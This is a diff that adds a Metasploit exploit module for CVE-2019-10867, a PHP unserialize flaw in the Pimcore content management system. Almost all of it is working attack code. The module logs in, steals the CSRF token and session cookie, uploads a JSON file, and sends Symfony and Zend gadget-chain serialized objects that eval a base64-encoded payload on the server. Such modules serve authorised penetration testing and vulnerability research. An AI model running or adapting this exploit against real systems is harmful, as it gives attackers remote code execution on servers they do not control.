@@ -1,0 +1,273 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "Pimcore Unserialize RCE",
+      'Description' => %q(
+        This module exploits a PHP unserialize() in Pimcore before 5.7.1 to
+        execute arbitrary code. An authenticated user with "classes" permission
+        could exploit the vulnerability.
+
+        The vulnerability exists in the "ClassController.php" class, where the
+        "bulk-commit" method makes it possible to exploit the unserialize function
+        when passing untrusted values in "data" parameter.
+
+        Tested on Pimcore 5.4.0-5.4.4, 5.5.1-5.5.4, 5.6.0-5.6.6 with the Symfony
+        unserialize payload.
+
+        Tested on Pimcore 4.0.0-4.6.5 with the Zend unserialize payload.
+      ),
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'Daniele Scanu', # Discovery & PoC
+          'Fabio Cogno' # Metasploit module
+        ],
+      'References' =>
+        [
+          ['CVE', '2019-10867'],
+          ['URL', 'https://github.com/pimcore/pimcore/commit/38a29e2f4f5f060a73974626952501cee05fda73'],
+          ['URL', 'https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-173998']
+        ],
+      'Platform' => 'php',
+      'Arch' => ARCH_PHP,
+      'Targets' =>
+        [
+          ['Pimcore 5.x (Symfony unserialize payload)', 'type' => :symfony],
+          ['Pimcore 4.x (Zend unserialize payload)', 'type' => :zend]
+        ],
+      'Payload' => {
+        'Space' => 8000,
+        'DisableNops' => true
+      },
+      'Privileged' => false,
+      'DisclosureDate' => "Mar 11 2019",
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base Pimcore directory path", '/']),
+        OptString.new('USERNAME', [true, "Username to authenticate with", '']),
+        OptString.new('PASSWORD', [false, "Password to authenticate with", ''])
+      ]
+    )
+  end
+
+  def login
+    # Try to login
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin', 'login', 'login'),
+      'vars_post' => {
+        'username' => datastore['USERNAME'],
+        'password' => datastore['PASSWORD']
+      }
+    )
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code == 302 && res.headers['Location'] =~ /\/admin\/\?_dc=/
+      print_good("Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+
+      # Grabbing CSRF token and PHPSESSID cookie
+      return grab_csrftoken(res)
+    end
+
+    if res.code == 302 && res.headers['Location'] =~ /auth_failed=true/
+      fail_with(Failure::NoAccess, 'Invalid credentials')
+    end
+
+    fail_with(Failure::NoAccess, 'Authentication was unsuccessful')
+  end
+
+  def grab_csrftoken(auth_res)
+    uri = "#{target_uri.path}admin/?_dc=#{auth_res.headers['Location'].scan(/\/admin\/\?_dc=([0-9]+)/).flatten.first}"
+
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(uri),
+      'cookie' => auth_res.get_cookies
+    )
+
+    if res && res.code == 200
+      # Pimcore 5.x
+      unless res.body.scan(/"csrfToken": "[a-z0-9]+",/).empty?
+        @csrf_token = res.body.scan(/"csrfToken": "([a-z0-9]+)",/).flatten.first.to_s
+        @pimcore_cookies = res.get_cookies.scan(/(PHPSESSID=[a-z0-9]+;)/).flatten[0]
+        fail_with(Failure::NotFound, 'Failed to retrieve cookies') unless @pimcore_cookies
+        @pimcore_cookies << " pimcore_admin_sid=1;"
+
+        # Version
+        version = res.body.scan(/"pimcore platform \(v([0-9]{1}\.[0-9]{1}\.[0-9]{1})\|([a-z0-9]+)\)"/i).flatten[0]
+        build = res.body.scan(/"pimcore platform \(v([0-9]{1}\.[0-9]{1}\.[0-9]{1})\|([a-z0-9]+)\)"/i).flatten[1]
+        fail_with(Failure::NotFound, 'Failed to retrieve the version and build') unless version && build
+        print_version(version, build)
+        return assign_target(version)
+      end
+
+      # Pimcore 4.x
+      unless res.body.scan(/csrfToken: "[a-z0-9]+",/).empty?
+        @csrf_token = res.body.scan(/csrfToken: "([a-z0-9]+)",/).flatten.first.to_s
+        @pimcore_cookies = res.get_cookies.scan(/(pimcore_admin_sid=[a-z0-9]+;)/).flatten[0]
+        fail_with(Failure::NotFound, 'Unable to retrieve cookies') unless @pimcore_cookies
+
+        # Version
+        version = res.body.scan(/version: "([0-9]{1}\.[0-9]{1}\.[0-9]{1})",/i).flatten[0]
+        build = res.body.scan(/build: "([0-9]+)",/i).flatten[0]
+        fail_with(Failure::NotFound, 'Failed to retrieve the version and build') unless version && build
+        print_version(version, build)
+        return assign_target(version)
+      end
+
+      # Version different from 4.x or 5.x
+      return nil
+    else
+      fail_with(Failure::NoAccess, 'Failed to grab csrfToken and PHPSESSID')
+    end
+  end
+
+  def print_version(version, build)
+    print_status("Pimcore version: #{version}")
+    print_status("Pimcore build: #{build}")
+  end
+
+  def assign_target(version)
+    if Gem::Version.new(version) >= Gem::Version.new('5.0.0') && Gem::Version.new(version) <= Gem::Version.new('5.6.6')
+      print_good("The target is vulnerable!")
+      return targets[0]
+    elsif Gem::Version.new(version) >= Gem::Version.new('4.0.0') && Gem::Version.new(version) <= Gem::Version.new('4.6.5')
+      print_good("The target is vulnerable!")
+      return targets[1]
+    else
+      print_error("The target is NOT vulnerable!")
+      return nil
+    end
+  end
+
+  def upload
+    # JSON file payload
+    fpayload = "{\"customlayout\":[{\"creationDate\": \"#{rand(1..9)}\", \"modificationDate\": \"#{rand(1..9)}\", \"userOwner\": \"#{rand(1..9)}\", \"userModification\": \"#{rand(1..9)}\"}]}"
+    # construct POST data
+    data = Rex::MIME::Message.new
+    data.add_part(fpayload, 'application/json', nil, "form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(3..9)}.json\"")
+
+    # send JSON file payload to bulk-import function
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin', 'class', 'bulk-import'),
+      'vars_get' => { 'csrfToken' => @csrf_token },
+      'cookie' => @pimcore_cookies,
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'data' => data.to_s
+    )
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code == 200
+      json = res.get_json_document
+      if json['success'] == true
+        print_good("JSON payload uploaded successfully: #{json['filename']}")
+        return json['filename']
+      else
+        print_warning('Could not determine JSON payload file upload')
+        return nil
+      end
+    end
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
+    )
+
+    unless res
+      return Exploit::CheckCode::Unknown
+    end
+
+    if res.code == 200 && res.headers =~ /pimcore/i || res.body =~ /pimcore/i
+      return Exploit::CheckCode::Detected
+    end
+
+    return Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    # Try to log in, grab csrfToken and select target
+    my_target = login
+    if my_target.nil?
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+
+    # Try to upload JSON payload file
+    fname = upload
+
+    unless fname.nil?
+      # Register uploaded JSON payload file for cleanup
+      register_files_for_cleanup(fname)
+    end
+
+    print_status("Selected payload: #{my_target.name}")
+
+    case my_target['type']
+    when :symfony
+      # The payload to execute
+      spayload = "php -r 'eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\"));'"
+
+      # The Symfony object payload
+      serialize = "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{"
+      serialize << "s:64:\"\x00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter\x00mergeByLifetime\";"
+      serialize << "s:9:\"proc_open\";"
+      serialize << "s:58:\"\x00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter\x00namespace\";a:0:{}"
+      serialize << "s:57:\"\x00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter\x00deferred\";"
+      serialize << "s:#{spayload.length}:\"#{spayload}\";}"
+    when :zend
+      # The payload to execute
+      spayload = "eval(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));"
+
+      # The Zend1 object payload
+      serialize = "a:2:{i:7;O:8:\"Zend_Log\":1:{s:11:\"\x00*\x00_writers\";a:1:{"
+      serialize << "i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\x00*\00_eventsToMail\";a:1:{"
+      serialize << "i:0;i:1;}s:22:\"\x00*\x00_layoutEventsToMail\";a:0:{}s:8:\"\00*\x00_mail\";"
+      serialize << "O:9:\"Zend_Mail\":0:{}s:10:\"\x00*\x00_layout\";O:11:\"Zend_Layout\":3:{"
+      serialize << "s:13:\"\x00*\x00_inflector\";O:23:\"Zend_Filter_PregReplace\":2:{"
+      serialize << "s:16:\"\x00*\x00_matchPattern\";s:7:\"/(.*)/e\";s:15:\"\x00*\x00_replacement\";"
+      serialize << "S:#{spayload.length}:\"#{spayload}\";}"
+      serialize << "s:20:\"\x00*\x00_inflectorEnabled\";b:1;s:10:\"\x00*\x00_layout\";"
+      serialize << "s:6:\"layout\";}s:22:\"\x00*\x00_subjectPrependText\";N;}}};i:7;i:7;}"
+    end
+
+    # send serialized payload
+    send_request_cgi(
+      {
+        'method' => 'POST',
+        'uri' => normalize_uri(target_uri, 'admin', 'class', 'bulk-commit'),
+        'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
+        'cookie' => @pimcore_cookies,
+        'vars_post' => {
+          'filename' => fname,
+          'data' => JSON.generate(
+            'type' => 'customlayout',
+            'name' => serialize
+          )
+        },
+        'headers' => {
+          'X-pimcore-csrf-token' => @csrf_token
+        }
+      }, 30
+    )
+  end
+end
